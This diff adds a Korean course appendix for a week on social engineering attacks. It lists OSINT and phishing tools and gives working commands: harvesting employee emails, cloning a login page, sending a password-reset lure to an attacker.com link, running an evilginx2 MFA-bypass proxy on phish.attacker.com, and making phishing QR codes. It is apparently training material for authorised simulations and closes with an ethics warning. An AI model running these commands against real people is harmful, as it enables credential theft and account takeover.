@@ -570,3 +570,108 @@ curl -s -X POST http://10.20.30.200:8003/ask \
 3. Bastion 자동 점검 결과를 *4-layer 수동 검증* (regex + format + NER + 사람 review) 후 ground truth 와 disagreement 비율 측정 — 자동화의 *최종 한계* 식별
 
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course1 Attack — Week 14 소셜 엔지니어링)
+
+| 기법 | lab step | 본문 도구 | OSS 도구 옵션 | 비고 |
+|------|----------|----------|---------------|------|
+| OSINT (사람) | s1 | manual | theHarvester / sherlock / maigret / Spiderfoot | sherlock = username 다중 사이트 |
+| 회사 정보 | s2 | LinkedIn manual | linkedin2username / OSINT-SAN | 이메일 패턴 추출 |
+| Phishing site clone | s3 | `wget --recursive` | SET / Gophish / evilginx2 / King-Phisher | evilginx 가 MFA 우회 가능 |
+| 이메일 발송 | s4 | `swaks / sendmail` | swaks / msmtp / Gophish (built-in) | Gophish 가 통합 |
+| 자격증명 수집 | s5 | clone + form action | SET / evilginx2 / Modlishka | Modlishka = MITM phish |
+| 첨부 payload | s6 | `msfvenom + maldoc` | msfvenom / Empire stagers / Sliver | maldoc 7주차 연결 |
+| QR 피싱 | s7 | `qrencode` | qrencode / qr-code-generator | 모바일 타깃 |
+| 음성 피싱 (vishing) | s8 | `Asterisk PBX` | Asterisk / Twilio / VoIP.ms | 학습 참고 |
+| 물리 (USB drop) | s9 | `Rubber Ducky / BadUSB` | DuckyScript / WHID / O.MG cable | HID 공격 |
+| 핑백 추적 | s10 | `pixel / web bug` | Canarytokens.org / 자체 webhook | open 추적 |
+| Pretexting | s11 | scenario design | 시나리오 + Gophish 캠페인 | |
+| MFA 우회 | s12 | `evilginx2` | evilginx2 / Modlishka | OTP/Push 우회 |
+| 가짜 OAuth | s13 | `hangoutPhish / OAuth phish` | Office365-Attacks / GoPhish | 토큰 탈취 |
+| 보고 | s15 | text | Gophish 자동 통계 + 사람 reaction 분류 | 클릭/입력/제출 비율 |
+
+### 학생 환경 준비 (한 번만 실행)
+
+```bash
+ssh ccc@192.168.0.112
+
+sudo apt update && sudo apt install -y \
+  swaks msmtp-mta \
+  set qrencode \
+  python3-pip git wget
+
+# theHarvester — 이메일 OSINT
+sudo apt install -y theharvester
+
+# sherlock — username 다중 사이트
+git clone https://github.com/sherlock-project/sherlock.git ~/sherlock
+pip3 install -r ~/sherlock/requirements.txt
+
+# maigret — sherlock 의 강화판
+pip3 install maigret
+
+# Spiderfoot
+git clone https://github.com/smicallef/spiderfoot.git ~/spiderfoot
+pip3 install -r ~/spiderfoot/requirements.txt
+
+# Gophish — phish 캠페인 플랫폼 (Go)
+mkdir -p ~/gophish && cd ~/gophish
+curl -sL https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip -o gophish.zip
+unzip gophish.zip
+chmod +x gophish
+
+# evilginx2 — MFA 우회 reverse proxy
+git clone https://github.com/kgretzky/evilginx2.git ~/evilginx2
+cd ~/evilginx2 && go build -o build/evilginx
+```
+
+### 핵심 시나리오
+
+```bash
+# 1) OSINT — 회사 직원 이메일 수집
+theHarvester -d example.com -b all -l 500 -f /tmp/oss.html
+
+# 2) sherlock — 특정 username 의 모든 SNS 발견
+python3 ~/sherlock/sherlock.py john_doe
+
+# 3) Gophish 캠페인 시작
+cd ~/gophish && sudo ./gophish
+# → https://localhost:3333 접속, admin / 초기 패스워드 (콘솔에 출력)
+
+# 4) Phishing site clone (단순, 학습용)
+cd /tmp/phish && wget --recursive --no-host-directories --convert-links \
+  --reject="*.css,*.js" https://login.example.com/
+
+# 5) 이메일 발송 — swaks (테스트)
+swaks --to victim@target.com --from "noreply@example.com" \
+  --header "Subject: Password Reset" \
+  --body "Click http://attacker.com/reset" \
+  --server smtp.example.com
+
+# 6) evilginx2 (MFA 우회 — 매우 강력, 실습 환경에서만)
+sudo ~/evilginx2/build/evilginx -p ~/evilginx2/phishlets
+> phishlets hostname o365 phish.attacker.com
+> phishlets enable o365
+> lures create o365
+> lures get-url 0
+# → 생성된 URL 을 victim 에게 전달
+
+# 7) QR 피싱
+qrencode -o /tmp/phish.png "https://phish.attacker.com/login"
+```
+
+### 방어 측 학습 (학생이 양면 학습)
+
+```bash
+# Sigma rule 으로 phishing 패턴 탐지
+# /opt/sigma/rules/email/
+
+# Mail header 분석 — DKIM/SPF/DMARC
+swaks --to test@target --header "Authentication-Results: ..."
+```
+
+> ⚠ **윤리적 경고**: 본 14주차의 도구는 모두 본인 회사 또는 명시적 허가 받은 phishing 시뮬레이션에만 사용. 외부 사용자 대상 phishing 은 형사처벌.
+
+학생은 본 14주차에서 **OSINT (theHarvester, sherlock) → 캠페인 (Gophish) → MFA 우회 (evilginx2)** 의 통합 흐름을 익힌다.
